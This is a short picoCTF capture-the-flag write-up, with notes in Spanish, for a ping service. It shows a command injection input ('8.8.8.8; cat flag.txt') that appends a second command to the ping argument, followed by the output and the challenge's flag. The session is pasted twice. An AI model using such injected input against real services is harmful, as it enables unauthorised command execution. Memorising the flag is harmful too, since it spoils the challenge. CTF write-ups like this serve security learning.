#### Descripción 
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
You can connect to the service here `nc mysterious-sea.picoctf.net 54637`
#### Solución
```
SebAcuna-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 54637
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.54 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.55 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.543/9.547/9.552/0.004 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}SebAcuna-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 54637
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.54 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.55 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.543/9.547/9.552/0.004 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}SebAcuna-picoctf@webshell:~$ picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}
```
#### Notas
Este fue suerte mas que nada, se me ocurrió concatenarle un cat a ver si es que existia el archivo flag.txt como el reto anterior y salió a la primera!
#### Referencias